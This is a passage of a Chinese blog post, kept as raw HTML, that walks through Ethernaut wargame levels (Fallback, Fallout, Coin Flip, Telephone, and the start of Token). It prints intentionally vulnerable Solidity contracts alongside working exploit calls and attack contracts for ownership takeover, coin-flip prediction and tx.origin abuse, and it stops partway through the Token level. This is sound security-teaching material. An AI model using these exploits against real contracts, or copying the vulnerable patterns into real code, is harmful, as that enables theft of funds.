<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Ethernaut wp | $2zz's Blog</title><meta name="keywords" content="misc,blockchain"><meta name="author" content="$2zz,szz_c3p6@qq.com"><meta name="copyright" content="$2zz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="区块链入门，每日一题 题目地址：Ethernaut (openzeppelin.com) 获取Rinkeby测试币：Faucets | Chainlink 以太坊钱包 Metamask Remix ide：http:&#x2F;&#x2F;remix.ethereum.org  Hello EthernautJust follow the guide Fallback目标是拿到这个合约的控制权，转出所有余额 &#x2F;&#x2F; S">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut wp">
<meta property="og:url" content="https://szzzy.github.io/post/62275aa2.html">
<meta property="og:site_name" content="$2zz&#39;s Blog">
<meta property="og:description" content="区块链入门，每日一题 题目地址：Ethernaut (openzeppelin.com) 获取Rinkeby测试币：Faucets | Chainlink 以太坊钱包 Metamask Remix ide：http:&#x2F;&#x2F;remix.ethereum.org  Hello EthernautJust follow the guide Fallback目标是拿到这个合约的控制权，转出所有余额 &#x2F;&#x2F; S">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.rmb.bdstatic.com/bjh/3f076e2005afb4b23f5e70d0bcc61a99.jpeg">
<meta property="article:published_time" content="2022-07-07T12:26:04.000Z">
<meta property="article:modified_time" content="2022-08-13T15:44:49.782Z">
<meta property="article:author" content="$2zz">
<meta property="article:tag" content="misc">
<meta property="article:tag" content="blockchain">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.rmb.bdstatic.com/bjh/3f076e2005afb4b23f5e70d0bcc61a99.jpeg"><link rel="shortcut icon" href="/img/bitbug_favicon.ico"><link rel="canonical" href="https://szzzy.github.io/post/62275aa2"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: $2zz","link":"链接: ","source":"来源: $2zz's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Ethernaut wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-13 23:44:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.rmb.bdstatic.com/bjh/d4484b84b1984aa8c45224433ba7aa7d.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.rmb.bdstatic.com/bjh/3f076e2005afb4b23f5e70d0bcc61a99.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">$2zz's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ethernaut wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-07T12:26:04.000Z" title="发表于 2022-07-07 20:26:04">2022-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-13T15:44:49.782Z" title="更新于 2022-08-13 23:44:49">2022-08-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeup/">writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ethernaut wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>区块链入门，每日一题</p>
<p>题目地址：<a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/">Ethernaut (openzeppelin.com)</a></p>
<p>获取Rinkeby测试币：<a target="_blank" rel="noopener" href="https://faucets.chain.link/rinkeby">Faucets | Chainlink</a></p>
<p>以太坊钱包 Metamask</p>
<p>Remix ide：<a target="_blank" rel="noopener" href="http://remix.ethereum.org/">http://remix.ethereum.org</a> </p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>Just follow the guide</p>
<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>目标是拿到这个合约的控制权，转出所有余额</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallback</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    contributions[msg.<span class="property">sender</span>] = <span class="number">1000</span> * (<span class="number">1</span> ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        <span class="built_in">require</span>(</span><br><span class="line">            msg.<span class="property">sender</span> == owner,</span><br><span class="line">            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">contribute</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &lt; <span class="number">0.001</span> ether);</span><br><span class="line">    contributions[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span>(contributions[msg.<span class="property">sender</span>] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getContribution</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> contributions[msg.<span class="property">sender</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    owner.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span> &amp;&amp; contributions[msg.<span class="property">sender</span>] &gt; <span class="number">0</span>);</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考察fallback function，这里就是<code>receive()</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">contribute</span>(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">//先调用一次contribute发送1 wei，让contributions[msg.sender] &gt; 0</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">value</span>: <span class="number">1</span>&#125;);</span><br><span class="line"><span class="comment">//使用 sendTransaction 函数，给合约地址转账1 wei，触发 fallback 函数执行</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">withdraw</span>();<span class="comment">//转钱</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getbalance</span>(contract.<span class="property">address</span>)<span class="comment">//检查合约余额，如果为0，那么任务完成</span></span><br></pre></td></tr></table></figure>

<p>​      </p>
<p>p.s.从 0.6 开始，fallback函数写法有变化</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//0.6之前</span></span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) external payable &#123;</span><br><span class="line">    currentBalance = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> + msg.<span class="property">value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0.6之后</span></span><br><span class="line"><span class="title function_">fallback</span>() external &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">receive</span>() payable external &#123;</span><br><span class="line">   currentBalance = currentBalance + msg.<span class="property">value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>fallback 和 receive 不是普通函数，而是新的函数类型，有特别的含义，所以在它们前面不能加 function 这个关键字。加上 function 之后，它们就变成了一般的函数，只能按一般函数来去调用。</li>
<li>每个合约最多有一个不带任何参数不带 function 关键字的 fallback 和 receive 函数。</li>
<li>receive 函数类型必须是 payable 的，并且里面的语句只有在通过外部地址往合约里转账的时候执行。</li>
<li>fallback 函数类型可以是 payable，也可以不是 payable 的，如果不是 payable 的，可以往合约发送非转账交易，如果交易里带有转账信息，交易会被 revert；如果是 payable 的，自然也就可以接受转账了。</li>
<li>尽管 fallback 可以是 payable 的，但并不建议这么做，声明为 payable 之后，其所消耗的 gas 最大量就会被限定在 2300。</li>
</ul>
<p><code>fallback</code> 和 <code>receive</code> 的执行场景</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">          send Ether</span><br><span class="line">               |</span><br><span class="line">      msg.data is empty?</span><br><span class="line">              / \</span><br><span class="line">            yes  no</span><br><span class="line">            /     \</span><br><span class="line">receive() exists?  fallback()</span><br><span class="line">         /   \</span><br><span class="line">        yes   no</span><br><span class="line">        /      \</span><br><span class="line">    receive()   fallback()</span><br></pre></td></tr></table></figure>



<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>目标是获得以下合约的所有权来完成这一关</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallout</span> &#123;</span><br><span class="line">  </span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Fal1out</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    allocations[owner] = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        <span class="built_in">require</span>(</span><br><span class="line">	            msg.<span class="property">sender</span> == owner,</span><br><span class="line">	            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocate</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    allocations[msg.<span class="property">sender</span>] = allocations[msg.<span class="property">sender</span>].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sendAllocation</span>(<span class="params">address payable allocator</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.<span class="title function_">transfer</span>(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">collectAllocations</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocatorBalance</span>(<span class="params">address allocator</span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到<code>Fallout</code> 的构造函数被写成了 <code>Fal1out</code> ，说明该函数不是构造函数，可以直接调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 调用该函数，修改 owner</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out();</span><br><span class="line"><span class="comment">// 确认是否修改成功</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>();</span><br></pre></td></tr></table></figure>

<p>p.s.这题就算改名也不行，因为这题是0.6.0，已经不支持和合约同名的构造函数了</p>
<p>0.6及以后版本的构造函数写法为</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>连续猜中10次硬币翻转的结果</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlip</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span>.<span class="title function_">sub</span>(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.<span class="title function_">div</span>(<span class="variable constant_">FACTOR</span>);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要过程</p>
<ul>
<li>获得上一块的 <code>hash</code> 值</li>
<li>判断与之前保存的 <code>hash</code> 值是否相等，相等则回退</li>
<li>根据 <code>blockValue/FACTOR</code> 的值判断为正或负，<code>FACTOR</code> 是2^255，即通过 <code>hash</code> 的首位判断</li>
</ul>
<p>看似随机，但是可以被预测。</p>
<p>硬币翻转的结果完全取决于前一个块的hash值，可以先运行一次这个算法，看当前块下得到的coin flip，然后把结果传过去即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlip</span> &#123;</span><br><span class="line">    </span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span>-<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue/<span class="variable constant_">FACTOR</span>;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line">  <span class="title class_">CoinFlip</span> expFlip;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address aimAddr</span>) public &#123;</span><br><span class="line">    expFlip = <span class="title class_">CoinFlip</span>(aimAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span>-<span class="number">1</span>));</span><br><span class="line">    uint256 coinFlip = <span class="title function_">uint256</span>(<span class="title function_">uint256</span>(blockValue) / <span class="variable constant_">FACTOR</span>);</span><br><span class="line">    bool guess = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    expFlip.<span class="title function_">flip</span>(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <a target="_blank" rel="noopener" href="http://remix.ethereum.org/">http://remix.ethereum.org</a> 部署到 Rinkeby测试网络上</p>
<p>连续hack十次即可，不过可能会失败，因为判断了revert()，需要不同区块hash，即一个区块只能执行一次</p>
<p>以太坊大约15秒生成一个区块</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="property">address</span></span><br><span class="line"><span class="comment">//查看实例地址，在部署exp的时候需要输入这个地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">consecutiveWins</span>()</span><br><span class="line"><span class="comment">//查看猜中次数</span></span><br></pre></td></tr></table></figure>



<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>目标获取合约的所有权</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Telephone</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.<span class="property">origin</span> != msg.<span class="property">sender</span>) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>msg.sender</code>是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。</p>
<p> <code>tx.origin</code> 是这个交易的原始发起方，无论中间有多少次合约内&#x2F;跨合约函数调用，而且一定是账户地址而不是合约地址。</p>
<p>假设一种情况，账户A通过合约B调用合约C，账户 A -&gt; 合约 B -&gt; 合约 C </p>
<ul>
<li>对于合约B来说，<code>tx.origin</code> 和 <code>msg.sender</code> 都是账户A</li>
<li>对于合约C来说，<code>tx.origin</code> 是账户 A，<code>msg.sender</code> 是合约 B</li>
</ul>
<p>因此这里部署一个第三方合约就行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Telephone</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="title class_">Telephone</span> tel;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address aimAddr</span>) public &#123;</span><br><span class="line">        tel = <span class="title class_">Telephone</span>(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        tel.<span class="title function_">changeOwner</span>(msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>增加自己的token</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Token</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">uint _initialSupply</span>) public &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _value</span>) public returns (bool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title 